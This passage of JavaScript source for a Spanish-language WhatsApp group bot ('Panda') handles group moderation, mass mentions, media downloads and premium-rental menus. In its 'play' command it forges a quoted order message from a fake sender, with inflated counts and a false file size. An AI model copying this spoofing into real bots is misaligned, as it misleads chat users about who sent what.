if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antilink) return reply('Modo Antilink Activado')
antilink = true
reply('ahora el grupo esta progetido de enlaces')
} else if (args[0] == 'off') {
if (!antilink) return reply('Antilink desactivado')
antilink = false
reply('El antilink ah sido desactivado')
} else {
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo Antilink`, `Activado o desactivado`, m)
}
break
case 'antiwame':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antiwame) return reply('Ah Sido activado')
antiwame = true
reply('Grupo AntiWa.me no envies enlaces Wa.me')
} else if (args[0] == 'off') {
if (!antiwame) return reply('Grupo AnriWa.me')
antiwame = false
reply('El antiwame a sido desactivado')
} else {
let buttons = [
{ buttonId: '.antiwame on', buttonText: { displayText: 'Activar' }, type: 1 },
{ buttonId: '.antiwame off', buttonText: { displayText: 'Desactivar' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo Antiwame`, `Apagado o Encendido`, m)
}
break
case 'antifacebook':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antifacebook) return reply('A Sido Activado')
antifacebook = true
reply('El grupo ahora es AntiFacebook')
} else if (args[0] == 'off') {
if (!antifacebook) return reply('Esta desactivado')
antifacebook = false
reply('El grupo no es AntiFacebook')
} else {
let buttons = [
{ buttonId: '.antifacebook on', buttonText: { displayText: 'encendido' }, type: 1 },
{ buttonId: '.antifacebook off', buttonText: { displayText: 'Off' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo AntiFavebook`, `Encendido o apagado`, m)
}
break

case 'antinstack':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antinstack) return reply('A Sido Activado')
antinstack = true
reply('El grupo ahora es Antinstagram')
} else if (args[0] == 'off') {
if (!antinstack) return reply('Esta desactivado')
antifacebook = false
reply('El grupo no es Antinstagram')
} else {
let buttons = [
{ buttonId: '.antinstack on', buttonText: { displayText: 'encendido' }, type: 1 },
{ buttonId: '.antinstack off', buttonText: { displayText: 'Off' }, type: 1 }
]
await Panda.sendButtonText(m.chat, buttons, `Modo AntiFavebook`, `Encendido o apagado`, m)
}
break

case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Panda.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'Segundos') {
var timer = args[0] * `1000`
} else if (args[1] == 'minutos') {
var timer = args[0] * `60000`
} else if (args[1] == 'Horas') {
var timer = args[0] * `3600000`
} else if (args[1] == 'Dias') {
var timer = args[0] * `86400000`
} else {
return reply('*Selecione:*\nsegundos\nmenit\nHoras\n\n*comando*\n10 segundos')
}
reply(`La hora de cierre de ${q} comienza ahora`)
setTimeout(() => {
var nomor = m.participant
const close = `*A tiempo* grupo cerrado por el administrador\nahora solo el administrador puede enviar mensajes`
Panda.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
case 'opentime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'segundos') {
var timer = args[0] * `1000`
} else if (args[1] == 'minutos') {
var timer = args[0] * `60000`
} else if (args[1] == 'Horas') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\nsegundos\nminutos\nHoras\n\n*contoh*\n10 segundos')
}
reply(`El tiempo de apertura ${q} comienza ahora`)
setTimeout(() => {
var nomor = m.participant
const open = `A tiempo* el administrador abrió el grupo\n ahora los miembros pueden enviar mensajes`
Panda.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Panda.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'newadmin': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Panda.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'deladmin': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Panda.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Mensaje?`)
Panda.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall':
case 'todos': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMePanda) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Mensaje??`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Invocando* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
Panda.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return reply(`Enviar/responder texto con subtítulos ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(q)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Enviar/responder texto con subtítulos ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(q)
reply(db)
}
break
case 'tiktokvideo':{
if (!q) return reply(`El enlace?\nComando ${prefix+command} https://vm.tiktok.com/ZSRAp6FR1K/`)
reply(mess.wait)
let res = await tiktokdl(q)
Panda.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
}
break
case 'tiktokaudio':{
if (!q) return reply(`Enlace?\nComando ${prefix+command} https://vm.tiktok.com/ZS5ApJHGK/`)
reply(mess.wait)
let tytyd = await tiktokdl(q)
Panda.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'googles': {
if (!q) return reply(`Ejemmplo : ${prefix + command} Panda WhatsApp`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Titulo* : ${g.title}\n`
teks += `⭔ *Descripcion* : ${g.snippet}\n`
teks += `⭔ *Enlace* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'happymod':{
if (!q) return reply(`Comando ${prefix+command} Nombre del apk`)
reply(mess.wait)
let kat = await scp1.happymod(q)
reply(util.format(kat))
}
break
case 'cariresep':{
if (!q) return reply(`Comando ${prefix+command} pollo aplastado`)
reply(mess.wait)
let ker = await scp1.cariresep(q)
reply(util.format(ker))
}

break
case 'search':
case 'ytsearch':
if (args.length < 1) return reply(`Comando :\n${prefix+command} Te amo bb`)
reply(mess.wait)
let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Canal: ${a.author.name} | Duracion: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const buttonNya = {
text: `Resultados de búsqueda de ${q}`,
footer: `Toque el botón de abajo`,
buttonText: 'Pulse aquí',
sections: [{
title: "Resultado de busqueda", 
rows: list_rows
}],
listType: 1
}
const sendMsg = await Panda.sendMessage(from, buttonNya)
break
case 'playdoc':
case 'playmusic':
case 'play':{
if (!text) return reply(`Ejemplo : ${prefix+command} Hola como estas`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '56921700706@s.whatsapp.net'
ngen = `
𝐓𝐢𝐭𝐮𝐥𝐨 : ${anu.title}
𝐕𝐢𝐬𝐭𝐚𝐬 : ${anu.views}
𝐒𝐮𝐛𝐢𝐝𝐨 At : ${anu.ago}
𝐀𝐮𝐭𝐨𝐫 : ${anu.author.name}
𝐂𝐚𝐧𝐚𝐥 : ${anu.author.url}`
let buttonse = [
{buttonId: `${prefix}mp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `${prefix}mp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Desarollador @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, owned],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hola ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": eek,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}}
}
Panda.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Panda',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'ytmp4': case 'mp4':{
if (!text) return reply('Y en enlace!!!')
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytmp3': case 'mp3':{
if (!text) return reply('Y el enlace!')
reply(mess.wait)
downloadMp3(text)
}
break
case 'donaralbot': case 'donar':{
Panda.sendMessage(from,{image:qrisdonate, caption:`Hola @${sender.split("@")[0]} Piensas en ${command}?\n\n\nHola si llegas a donar te lo agradeceria mucho,asi me motivas a darle un mantenimiento al bot\n\n𝗠𝗼𝗱𝗼 𝗱𝗲 𝗽𝗮𝗴𝗼 : Paypal\npaypal.me/Blackpandamodsymas\n\nTambien me ayudas siguiendome en mi redes\n\n𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 :\nhttps://www.instagram.com/black_panda_mods12/\n\n𝗬𝗼𝘂𝘁𝘂𝗯𝗲 :\nhttps://youtube.com/c/BlackPandaModsymas\n\nhttps://youtube.com/channel/UCx2DoEC6kb_3kYbYiWkCQFA\n\n\n𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 :\nwwww.facebook.com/blackpandamodsyt\n\n\n\n𝗕𝗹𝗮𝗰𝗸 𝗣𝗮𝗻𝗱𝗮 𝗕𝗼𝘁 𝗠𝗗.`, mentions: [sender]},{quoted:m})
}
break
case 'buypremium': case 'jadiowner': case 'sewabot':{
const seactiones = [
{
title: `LISTA SEWABOT`,
rows: [
{title: `1 Semana`, rowId: `${prefix}sewakay 1 semana`},
{title: `1 Mes`, rowId: `${prefix}sewakay 1mes`},
{title: `1 TAHUN`, rowId: `${prefix}sewakay 1 año`},
{title: `PERMANENTE`, rowId: `${prefix}sewakay permanente`},
]
},
{
title: `LISTA PREMIUM`,
rows: [
{title: `1 Semana`, rowId: `${prefix}premkay 1semana`},
{title: `1 Mes`, rowId: `${prefix}premkay 1 mes`},
{title: `1 Año`, rowId: `${prefix}premkay 1 año`},
{title: `PERMANENTE`, rowId: `${prefix}premkay permanente`},
]
},
{
title: `LISTA JADI OWNER`,
rows: [
{title: `1 Semana`, rowId: `${prefix}ownkay 1 Semana`},
{title: `1 Mes`, rowId: `${prefix}ownkay 1 Mes`},
{title: `1 Año`, rowId: `${prefix}ownkay 1 Año`},
{title: `PERMANENTE`, rowId: `${prefix}ownkay permanente`},
]
}
]
const listSw = { 
text: `Hola @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `¿Quieres ${command}? Por favor haga clic debajo de Sí `,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
Panda.sendMessage(from, listSw, { quoted: m })
}
break
case 'sewakay':
if ((args[0]) == '1Semana'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN❏*
📮 : *Paquete:* 10K • Sewabot 1 Semana
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Mes'){
